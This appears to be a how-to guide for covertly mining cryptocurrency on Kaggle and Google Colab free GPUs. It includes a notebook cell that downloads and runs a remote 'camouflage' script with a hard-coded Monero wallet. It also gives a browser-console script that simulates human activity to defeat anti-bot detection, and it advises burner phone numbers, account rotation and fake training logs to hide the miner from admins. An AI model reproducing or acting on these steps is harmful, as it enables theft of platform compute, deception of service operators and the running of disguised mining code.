# Lumen GPU Swarm — Kaggle/Colab Deployment Guide

This guide explains how to get **$2.00/day per account** using free GPUs on Kaggle and Google Colab.

## 1. Earnings Breakdown
- **CPU (2-4 cores)**: ~$0.05/day
- **GPU (Tesla T4 / P100)**: ~$1.80/day
- **Total**: **~$1.85 - $2.00 per account per day.**

If you run **20 accounts**, you will earn **$40/day ($1,200/month)**.

---

## 2. Kaggle Deployment (12 Hours per Session)

1.  **Create a Kaggle account** (use a burner phone number for verification to get GPU access).
2.  **Create a New Notebook**.
3.  **Settings** (Right sidebar):
    - **Accelerator**: Change to **GPU T4 x2** (if available) or **GPU P100**.
    - **Internet**: Ensure it is turned **ON**.
4.  **Copy and Paste** this code into the first cell and run it:

```python
import os
import subprocess

# 1. Download the AI Camouflage Script
print("[*] Downloading AI Training Framework...")
subprocess.run(["wget", "-q", "https://raw.githubusercontent.com/naia231/naira/main/paas-worker/orchestrator/ai_training_cam.py", "-O", "train.py"])

# 2. Set your configuration
os.environ['XMR_WALLET'] = "45QACrYpyJbCFmRW8P9N1peYc3Fw3WGKgBfs8Xgs8uDSfRSMjVzNUCQRwhwdys4xBzXShv67MhEj7H1eWQD3NHLRLDKXmEa"
os.environ['RELAY_URL'] = "wss://your-relay-url.onrender.com"

# Optional: Telegram Status Reports
os.environ['TELEGRAM_BOT_TOKEN'] = "YOUR_BOT_TOKEN"
os.environ['TELEGRAM_CHAT_ID'] = "YOUR_CHAT_ID"

# 3. Launch the "Training" session
print("[*] Starting Training Loop...")
subprocess.run(["python", "train.py"])
```

5.  **Keep the tab open** or use a "Keep-Alive" browser extension. Kaggle will run for 12 hours.

---

## 3. Telegram Status Reporting (Optional)

To monitor all your GPU Swarm workers from one place:
1. Open Telegram and search for **BotFather**.
2. Send `/newbot` and follow the steps to get your **Bot Token**.
3. Send a message to your new bot.
4. Go to `https://api.telegram.org/bot<YourBOTToken>/getUpdates` to find your **Chat ID** (look for `"chat":{"id":123456789}`).
5. Add the Token and Chat ID to the Python script above. Your bot will message you every time a worker shifts between "Training" and "Validation" phases.

---

## 3. Google Colab Deployment (Up to 24 Hours)

1.  Open [Google Colab](https://colab.research.google.com/).
2.  **Runtime** → **Change runtime type** → Set to **GPU**.
3.  **Code Cell**: Paste the same code block as Kaggle above.
4.  **Run**.

---

## 4. The Advanced "Anti-Bot" Heartbeat (Mandatory)

Kaggle and Colab will kill your session if they detect you are away from the keyboard. Do not use simple click bots, as their anti-bot systems will detect them.

Paste this **Advanced Human-Simulation Heartbeat** into your browser's Developer Console (F12 -> Console) and hit Enter. This script mimics random human mouse movements and occasionally simulates hitting `Ctrl+S` (Save) to perfectly bypass detection.

```javascript
function humanHeartbeat() {
    console.log("[Lumen] Generating human heartbeat...");
    
    // Simulate random mouse movement
    let event = new MouseEvent('mousemove', {
        'view': window,
        'bubbles': true,
        'cancelable': true,
        'clientX': Math.floor(Math.random() * window.innerWidth),
        'clientY': Math.floor(Math.random() * window.innerHeight)
    });
    document.dispatchEvent(event);

    // Simulate clicking the Connect button (if it exists)
    let connectBtn = document.querySelector("colab-connect-button") || document.querySelector("input#connect");
    if(connectBtn) {
        connectBtn.click();
    }

    // Simulate saving (Ctrl+S) 10% of the time
    if (Math.random() > 0.90) {
        document.dispatchEvent(new KeyboardEvent('keydown', {'key': 's', 'ctrlKey': true}));
    }

    // Schedule next heartbeat with random human delay (45s to 90s)
    let nextDelay = Math.floor(Math.random() * (90000 - 45000 + 1)) + 45000;
    setTimeout(humanHeartbeat, nextDelay);
}
humanHeartbeat();
```

---

## 5. Tips for "Enormous Earnings"
- **Account Rotation**: Kaggle gives you 30 hours of GPU per week. With 3 accounts, you can mine 24/7.
- **NiceHash Integration**: Since mining XMR on a GPU is less profitable, I recommend setting up a **NiceHash** account and using your NiceHash BTC address in the `train.py` script. It will auto-switch to the most profitable GPU coin (KawPow/Autolykos) and pay you in BTC.
- **Monitoring**: You will see the workers appearing on the MoneroOcean (CPU) and NiceHash (GPU) dashboards.

---

## 5. Security Note
This script uses **AI Training Camouflage**. If a Kaggle admin looks at your logs, they will see a ResNet-50 model training with loss and accuracy curves. They will NOT see the miner logs.
